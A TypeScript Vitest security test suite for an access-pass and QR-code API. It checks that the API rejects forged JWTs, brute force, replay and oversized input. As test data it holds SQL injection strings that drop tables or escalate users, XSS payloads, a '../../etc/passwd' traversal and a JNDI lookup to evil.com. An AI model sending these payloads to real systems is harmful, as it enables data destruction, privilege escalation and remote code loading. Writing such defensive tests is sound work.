import { describe, it, expect, beforeEach, afterEach, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import app from '../../src/app.js';
import { Database } from '../../src/utils/database.js';
import { UserModel } from '../../src/models/user.model.js';
import { MerchantModel } from '../../src/models/merchant.model.js';
import { PasscodeModel } from '../../src/models/passcode.model.js';
import { PasscodeService } from '../../src/services/passcode.service.js';
import { QRCodeUtils } from '../../src/utils/qrcode.js';
import { JWTUtils } from '../../src/utils/jwt.js';
import crypto from 'crypto';
import type { User, Merchant } from '../../src/types/index.js';

describe('通行系统安全测试', () => {
    let testMerchant: Merchant;
    let testEmployee: User;
    let testVisitor: User;
    let maliciousUser: User;
    let employeeToken: string;
    let maliciousToken: string;

    beforeAll(async () => {
        await Database.getInstance().init();
    });

    afterAll(async () => {
        await Database.getInstance().close();
    });

    beforeEach(async () => {
        // 创建测试商户
        testMerchant = await MerchantModel.create({
            name: '安全测试公司',
            code: 'SEC_TEST',
            contact: '安全测试员',
            phone: '13800138000',
            status: 'active'
        });

        // 创建测试员工
        testEmployee = await UserModel.create({
            name: '测试员工',
            phone: '13800138001',
            user_type: 'employee',
            status: 'active',
            merchant_id: testMerchant.id,
            open_id: 'employee_openid'
        });

        // 创建测试访客
        testVisitor = await UserModel.create({
            name: '测试访客',
            phone: '13800138002',
            user_type: 'visitor',
            status: 'active',
            open_id: 'visitor_openid'
        });

        // 创建恶意用户
        maliciousUser = await UserModel.create({
            name: '恶意用户',
            phone: '13800138003',
            user_type: 'visitor',
            status: 'active',
            open_id: 'malicious_openid'
        });

        // 生成认证token
        employeeToken = JWTUtils.generateToken({
            userId: testEmployee.id,
            userType: testEmployee.user_type,
            merchantId: testEmployee.merchant_id
        });

        maliciousToken = JWTUtils.generateToken({
            userId: maliciousUser.id,
            userType: maliciousUser.user_type,
            merchantId: null
        });
    });

    afterEach(async () => {
        // 清理测试数据
        await Database.getInstance().run('DELETE FROM access_records');
        await Database.getInstance().run('DELETE FROM passcodes');
        await Database.getInstance().run('DELETE FROM users');
        await Database.getInstance().run('DELETE FROM merchants');
    });

    describe('认证和授权安全测试', () => {
        it('应该拒绝无效的JWT token', async () => {
            const invalidTokens = [
                'invalid.jwt.token',
                'Bearer invalid_token',
                'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
                '', // 空token
                'null',
                'undefined'
            ];

            for (const token of invalidTokens) {
                const response = await request(app)
                    .get('/api/v1/access/passcode/current')
                    .set('Authorization', token);

                expect(response.status).toBe(401);
            }
        });

        it('应该拒绝过期的JWT token', async () => {
            // 生成一个已过期的token
            const expiredToken = JWTUtils.generateToken(
                {
                    userId: testEmployee.id,
                    userType: testEmployee.user_type,
                    merchantId: testEmployee.merchant_id
                },
                '-1h' // 1小时前过期
            );

            const response = await request(app)
                .get('/api/v1/access/passcode/current')
                .set('Authorization', `Bearer ${expiredToken}`);

            expect(response.status).toBe(401);
        });

        it('应该拒绝被篡改的JWT token', async () => {
            // 篡改token的payload部分
            const validToken = employeeToken;
            const parts = validToken.split('.');
            const tamperedPayload = Buffer.from('{"userId":999,"userType":"tenant_admin"}').toString('base64url');
            const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;

            const response = await request(app)
                .get('/api/v1/access/passcode/current')
                .set('Authorization', `Bearer ${tamperedToken}`);

            expect(response.status).toBe(401);
        });

        it('应该防止权限提升攻击', async () => {
            // 恶意用户尝试访问管理员接口
            const response = await request(app)
                .get('/api/v1/access/stats')
                .set('Authorization', `Bearer ${maliciousToken}`);

            expect(response.status).toBe(403); // 权限不足
        });

        it('应该防止跨用户数据访问', async () => {
            // 创建另一个用户的通行码
            const otherUser = await UserModel.create({
                name: '其他用户',
                phone: '13800138004',
                user_type: 'employee',
                status: 'active',
                merchant_id: testMerchant.id,
                open_id: 'other_openid'
            });

            // 恶意用户尝试访问其他用户的通行记录
            const response = await request(app)
                .get(`/api/v1/access/records/user/${otherUser.id}`)
                .set('Authorization', `Bearer ${maliciousToken}`);

            expect(response.status).toBe(403); // 应该被拒绝
        });
    });

    describe('通行码安全测试', () => {
        it('应该防止通行码暴力破解', async () => {
            const bruteForceAttempts = 100;
            const invalidCodes = Array.from({ length: bruteForceAttempts }, (_, i) =>
                `BRUTE_FORCE_${i.toString().padStart(6, '0')}`
            );

            const startTime = Date.now();

            // 并发尝试暴力破解
            const promises = invalidCodes.map(code =>
                request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code,
                        deviceId: 'brute_force_device',
                        direction: 'in'
                    })
            );

            const responses = await Promise.all(promises);
            const endTime = Date.now();
            const duration = endTime - startTime;

            // 所有尝试都应该失败
            responses.forEach(response => {
                expect(response.status).toBe(200);
                expect(response.body.success).toBe(false);
            });

            // 系统应该在合理时间内响应（不应该因为大量请求而显著变慢）
            expect(duration).toBeLessThan(10000); // 10秒内完成

            console.log(`暴力破解测试: ${bruteForceAttempts} 次尝试耗时 ${duration}ms`);
        });

        it('应该防止通行码重放攻击', async () => {
            // 生成有效通行码
            const passcode = await PasscodeService.generatePasscode(testEmployee.id, 'employee', {
                usageLimit: 1 // 限制使用一次
            });

            // 第一次使用（应该成功）
            const firstResponse = await request(app)
                .post('/api/v1/access/validate')
                .send({
                    code: passcode.code,
                    deviceId: 'replay_device',
                    direction: 'in'
                });

            expect(firstResponse.status).toBe(200);
            expect(firstResponse.body.success).toBe(true);

            // 重放攻击（应该失败）
            const replayResponse = await request(app)
                .post('/api/v1/access/validate')
                .send({
                    code: passcode.code,
                    deviceId: 'replay_device',
                    direction: 'in'
                });

            expect(replayResponse.status).toBe(200);
            expect(replayResponse.body.success).toBe(false);
            expect(replayResponse.body.message).toContain('使用次数已达上限');
        });

        it('应该防止通行码枚举攻击', async () => {
            // 尝试枚举可能的通行码格式
            const enumerationPatterns = [
                'USER_1_CODE',
                'EMPLOYEE_001',
                'PASS_123456',
                '000000',
                '123456',
                'ABCDEF',
                'TEST_CODE_1',
                'ACCESS_001'
            ];

            const promises = enumerationPatterns.map(code =>
                request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code,
                        deviceId: 'enum_device',
                        direction: 'in'
                    })
            );

            const responses = await Promise.all(promises);

            // 所有枚举尝试都应该失败
            responses.forEach(response => {
                expect(response.status).toBe(200);
                expect(response.body.success).toBe(false);
                expect(response.body.message).toBe('通行码不存在');
            });
        });

        it('应该确保通行码的随机性和唯一性', async () => {
            const codeCount = 1000;
            const codes: string[] = [];

            // 生成大量通行码
            for (let i = 0; i < codeCount; i++) {
                const user = i % 2 === 0 ? testEmployee : testVisitor;
                const passcode = await PasscodeService.generatePasscode(user.id, 'employee');
                codes.push(passcode.code);
            }

            // 验证唯一性
            const uniqueCodes = new Set(codes);
            expect(uniqueCodes.size).toBe(codeCount);

            // 验证随机性（简单的统计测试）
            const codeChars = codes.join('');
            const charFrequency: { [key: string]: number } = {};

            for (const char of codeChars) {
                charFrequency[char] = (charFrequency[char] || 0) + 1;
            }

            // 字符分布应该相对均匀（没有明显的偏向）
            const frequencies = Object.values(charFrequency);
            const avgFreq = frequencies.reduce((a, b) => a + b, 0) / frequencies.length;
            const variance = frequencies.reduce((sum, freq) => sum + Math.pow(freq - avgFreq, 2), 0) / frequencies.length;
            const stdDev = Math.sqrt(variance);

            // 标准差不应该过大（表示分布相对均匀）
            expect(stdDev / avgFreq).toBeLessThan(0.5); // 变异系数小于50%
        });
    });

    describe('二维码安全测试', () => {
        it('应该防止二维码内容篡改', async () => {
            // 生成有效的二维码
            const qrResult = await PasscodeService.generateDynamicQRPasscode(testEmployee.id, 'employee');

            // 尝试篡改二维码内容
            const tamperedContents = [
                qrResult.qrContent.slice(0, -10) + 'TAMPERED123', // 修改末尾
                qrResult.qrContent.replace(/[0-9]/g, '9'), // 替换所有数字
                qrResult.qrContent.split(':').reverse().join(':'), // 颠倒IV和加密内容
                'COMPLETELY_FAKE_QR_CONTENT',
                qrResult.qrContent + 'EXTRA_DATA' // 添加额外数据
            ];

            for (const tamperedContent of tamperedContents) {
                const response = await request(app)
                    .post('/api/v1/access/validate/qr')
                    .send({
                        qrContent: tamperedContent,
                        deviceId: 'tamper_device',
                        direction: 'in'
                    });

                expect(response.status).toBe(200);
                expect(response.body.success).toBe(false);
                expect(response.body.message).toContain('二维码');
            }
        });

        it('应该防止二维码重放攻击', async () => {
            // 生成二维码
            const qrResult = await PasscodeService.generateDynamicQRPasscode(testEmployee.id, 'employee');

            // 验证二维码包含防重放的nonce
            const parsedQR = QRCodeUtils.parseQRCodeContent(qrResult.qrContent);
            expect(parsedQR?.nonce).toBeTruthy();
            expect(parsedQR?.nonce.length).toBeGreaterThan(0);

            // 生成另一个二维码，验证nonce不同
            const qrResult2 = await PasscodeService.generateDynamicQRPasscode(testEmployee.id, 'employee');
            const parsedQR2 = QRCodeUtils.parseQRCodeContent(qrResult2.qrContent);

            expect(parsedQR?.nonce).not.toBe(parsedQR2?.nonce);
        });

        it('应该防止二维码时间操纵攻击', async () => {
            // 生成一个很快过期的二维码
            const shortExpiryTime = new Date(Date.now() + 1000); // 1秒后过期
            const qrContent = QRCodeUtils.generateQRCodeContent(
                testEmployee.id,
                'employee',
                shortExpiryTime,
                ['basic_access']
            );

            // 等待过期
            await new Promise(resolve => setTimeout(resolve, 1500));

            // 尝试使用过期的二维码
            const response = await request(app)
                .post('/api/v1/access/validate/qr')
                .send({
                    qrContent,
                    deviceId: 'time_attack_device',
                    direction: 'in'
                });

            expect(response.status).toBe(200);
            expect(response.body.success).toBe(false);
            expect(response.body.message).toBe('二维码已过期');
        });

        it('应该使用强加密保护二维码内容', async () => {
            // 生成二维码
            const qrContent = QRCodeUtils.generateQRCodeContent(
                testEmployee.id,
                'employee',
                new Date(Date.now() + 3600000),
                ['sensitive_access']
            );

            // 验证加密格式
            expect(qrContent).toContain(':'); // 应该包含IV分隔符

            const parts = qrContent.split(':');
            expect(parts).toHaveLength(2);

            const [iv, encrypted] = parts;
            expect(iv).toHaveLength(32); // 16字节IV的十六进制表示
            expect(encrypted.length).toBeGreaterThan(0);

            // 验证IV是随机的（生成多个二维码，IV应该不同）
            const qrContent2 = QRCodeUtils.generateQRCodeContent(
                testEmployee.id,
                'employee',
                new Date(Date.now() + 3600000),
                ['sensitive_access']
            );

            const iv2 = qrContent2.split(':')[0];
            expect(iv).not.toBe(iv2);
        });
    });

    describe('时效性通行码安全测试', () => {
        it('应该防止时间窗口操纵', async () => {
            const baseCode = 'TIME_SECURITY_TEST';

            // 生成当前时间窗口的时效性码
            const currentTimeCode = QRCodeUtils.generateTimeBasedCode(baseCode, 5);

            // 验证当前码有效
            expect(QRCodeUtils.validateTimeBasedCode(currentTimeCode, baseCode, 5)).toBe(true);

            // 尝试使用不同时间窗口的码（模拟攻击者尝试猜测其他时间窗口）
            const futureTimeCode = QRCodeUtils.generateTimeBasedCode(baseCode, 1); // 不同时间窗口
            const pastTimeCode = QRCodeUtils.generateTimeBasedCode(baseCode, 10); // 不同时间窗口

            // 这些码在当前时间窗口下应该无效（除非碰巧在容错范围内）
            const futureValid = QRCodeUtils.validateTimeBasedCode(futureTimeCode, baseCode, 5);
            const pastValid = QRCodeUtils.validateTimeBasedCode(pastTimeCode, baseCode, 5);

            // 至少有一个应该无效（因为时间窗口不同）
            expect(futureValid && pastValid && futureTimeCode !== currentTimeCode && pastTimeCode !== currentTimeCode).toBe(false);
        });

        it('应该限制时效性码的容错范围', async () => {
            const baseCode = 'TOLERANCE_TEST';
            const timeWindow = 5; // 5分钟窗口

            // 生成当前时间窗口的码
            const currentCode = QRCodeUtils.generateTimeBasedCode(baseCode, timeWindow);

            // 验证当前码有效
            expect(QRCodeUtils.validateTimeBasedCode(currentCode, baseCode, timeWindow)).toBe(true);

            // 模拟时间前进到下一个窗口（应该仍然有效，因为有1个窗口的容错）
            const originalNow = Date.now;
            Date.now = () => originalNow() + timeWindow * 60 * 1000;

            expect(QRCodeUtils.validateTimeBasedCode(currentCode, baseCode, timeWindow)).toBe(true);

            // 模拟时间前进到第二个窗口（应该无效，超出容错范围）
            Date.now = () => originalNow() + 2 * timeWindow * 60 * 1000;

            expect(QRCodeUtils.validateTimeBasedCode(currentCode, baseCode, timeWindow)).toBe(false);

            // 恢复原始时间函数
            Date.now = originalNow;
        });
    });

    describe('输入验证和注入攻击防护', () => {
        it('应该防止SQL注入攻击', async () => {
            const sqlInjectionPayloads = [
                "'; DROP TABLE passcodes; --",
                "' OR '1'='1",
                "'; UPDATE users SET user_type='tenant_admin' WHERE id=1; --",
                "' UNION SELECT * FROM users --",
                "'; INSERT INTO passcodes (code) VALUES ('HACKED'); --"
            ];

            for (const payload of sqlInjectionPayloads) {
                const response = await request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code: payload,
                        deviceId: 'sql_injection_device',
                        direction: 'in'
                    });

                expect(response.status).toBe(200);
                expect(response.body.success).toBe(false);
                expect(response.body.message).toBe('通行码不存在');
            }

            // 验证数据库没有被破坏
            const userCount = await Database.getInstance().get('SELECT COUNT(*) as count FROM users');
            expect(userCount.count).toBeGreaterThan(0);
        });

        it('应该防止XSS攻击', async () => {
            const xssPayloads = [
                '<script>alert("XSS")</script>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                '<img src="x" onerror="alert(\'XSS\')">',
                '${alert("XSS")}'
            ];

            for (const payload of xssPayloads) {
                const response = await request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code: payload,
                        deviceId: payload,
                        direction: 'in'
                    });

                expect(response.status).toBe(200);

                // 响应中不应该包含未转义的脚本内容
                const responseText = JSON.stringify(response.body);
                expect(responseText).not.toContain('<script>');
                expect(responseText).not.toContain('javascript:');
                expect(responseText).not.toContain('onerror=');
            }
        });

        it('应该验证输入长度限制', async () => {
            const longPayloads = [
                'A'.repeat(1000), // 超长通行码
                'B'.repeat(10000), // 极长设备ID
                'C'.repeat(100000) // 超极长输入
            ];

            for (const payload of longPayloads) {
                const response = await request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code: payload,
                        deviceId: payload.slice(0, 100), // 限制设备ID长度
                        direction: 'in'
                    });

                expect(response.status).toBe(200);
                expect(response.body.success).toBe(false);
            }
        });

        it('应该验证输入字符集', async () => {
            const invalidCharPayloads = [
                '通行码中文', // 中文字符
                'код_кириллица', // 西里尔字符
                '🔒🔑🚪', // emoji
                '\x00\x01\x02', // 控制字符
                '../../etc/passwd', // 路径遍历
                '${jndi:ldap://evil.com/}' // JNDI注入
            ];

            for (const payload of invalidCharPayloads) {
                const response = await request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code: payload,
                        deviceId: 'char_test_device',
                        direction: 'in'
                    });

                expect(response.status).toBe(200);
                expect(response.body.success).toBe(false);
            }
        });
    });

    describe('速率限制和DoS防护', () => {
        it('应该处理大量并发请求而不崩溃', async () => {
            const concurrentRequests = 200;
            const startTime = Date.now();

            // 发送大量并发请求
            const promises = Array.from({ length: concurrentRequests }, (_, i) =>
                request(app)
                    .post('/api/v1/access/validate')
                    .send({
                        code: `DOS_TEST_${i}`,
                        deviceId: `dos_device_${i}`,
                        direction: 'in'
                    })
            );

            const responses = await Promise.all(promises);
            const endTime = Date.now();
            const duration = endTime - startTime;

            // 所有请求都应该得到响应
            expect(responses).toHaveLength(concurrentRequests);

            // 响应时间应该在合理范围内
            expect(duration).toBeLessThan(30000); // 30秒内完成

            // 服务器应该保持稳定
            responses.forEach(response => {
                expect(response.status).toBe(200);
                expect(response.body).toHaveProperty('success');
            });

            console.log(`DoS测试: ${concurrentRequests} 个并发请求耗时 ${duration}ms`);
        });

        it('应该处理恶意的大请求体', async () => {
            const largePayload = {
                code: 'LARGE_PAYLOAD_TEST',
                deviceId: 'large_device',
                direction: 'in',
                maliciousData: 'X'.repeat(1024 * 1024) // 1MB的垃圾数据
            };

            const response = await request(app)
                .post('/api/v1/access/validate')
                .send(largePayload);

            // 应该正常处理或拒绝，不应该崩溃
            expect([200, 400, 413]).toContain(response.status);
        });
    });

    describe('数据泄露防护', () => {
        it('应该不在错误消息中泄露敏感信息', async () => {
            // 尝试各种可能导致错误的请求
            const errorTestCases = [
                { code: null, deviceId: 'test' },
                { code: 'test', deviceId: null },
                { code: 'test', deviceId: 'test', direction: 'invalid' },
                { invalidField: 'test' }
            ];

            for (const testCase of errorTestCases) {
                const response = await request(app)
                    .post('/api/v1/access/validate')
                    .send(testCase);

                const responseText = JSON.stringify(response.body);

                // 错误消息不应该包含敏感信息
                expect(responseText).not.toMatch(/password/i);
                expect(responseText).not.toMatch(/secret/i);
                expect(responseText).not.toMatch(/key/i);
                expect(responseText).not.toMatch(/token/i);
                expect(responseText).not.toMatch(/database/i);
                expect(responseText).not.toMatch(/sql/i);
                expect(responseText).not.toMatch(/error.*at.*line/i);
            }
        });

        it('应该不在响应头中泄露服务器信息', async () => {
            const response = await request(app)
                .post('/api/v1/access/validate')
                .send({
                    code: 'HEADER_TEST',
                    deviceId: 'header_device',
                    direction: 'in'
                });

            // 检查响应头不包含敏感信息
            expect(response.headers['server']).toBeUndefined();
            expect(response.headers['x-powered-by']).toBeUndefined();
        });

        it('应该正确处理敏感数据的日志记录', async () => {
            // 这个测试主要是确保敏感数据不会被记录到日志中
            // 在实际实现中，应该确保通行码、密码等敏感信息不会出现在日志中

            const sensitiveCode = 'SENSITIVE_CODE_123';

            const response = await request(app)
                .post('/api/v1/access/validate')
                .send({
                    code: sensitiveCode,
                    deviceId: 'log_test_device',
                    direction: 'in'
                });

            expect(response.status).toBe(200);

            // 注意：在实际应用中，这里应该检查日志文件确保敏感数据没有被记录
            // 这里我们只能验证响应本身不包含不必要的敏感信息
        });
    });

    describe('加密和哈希安全测试', () => {
        it('应该使用安全的随机数生成', async () => {
            const randomIds = Array.from({ length: 100 }, () => QRCodeUtils.generateUniqueId());

            // 验证唯一性
            const uniqueIds = new Set(randomIds);
            expect(uniqueIds.size).toBe(100);

            // 验证随机性（简单的统计测试）
            const firstChars = randomIds.map(id => id[0]);
            const charCounts = firstChars.reduce((acc, char) => {
                acc[char] = (acc[char] || 0) + 1;
                return acc;
            }, {} as Record<string, number>);

            // 第一个字符的分布应该相对均匀
            const counts = Object.values(charCounts);
            const maxCount = Math.max(...counts);
            const minCount = Math.min(...counts);

            // 最大和最小计数的差异不应该太大
            expect(maxCount - minCount).toBeLessThan(20);
        });

        it('应该使用强密码哈希（如果适用）', async () => {
            // 测试密码哈希的强度（如果系统中使用了密码）
            const testPasswords = ['password123', 'admin', '123456', 'qwerty'];

            for (const password of testPasswords) {
                // 模拟密码哈希过程
                const hash1 = crypto.pbkdf2Sync(password, 'salt1', 10000, 64, 'sha512').toString('hex');
                const hash2 = crypto.pbkdf2Sync(password, 'salt2', 10000, 64, 'sha512').toString('hex');

                // 相同密码使用不同盐应该产生不同哈希
                expect(hash1).not.toBe(hash2);

                // 哈希长度应该足够
                expect(hash1.length).toBe(128); // 64字节的十六进制表示
            }
        });
    });
});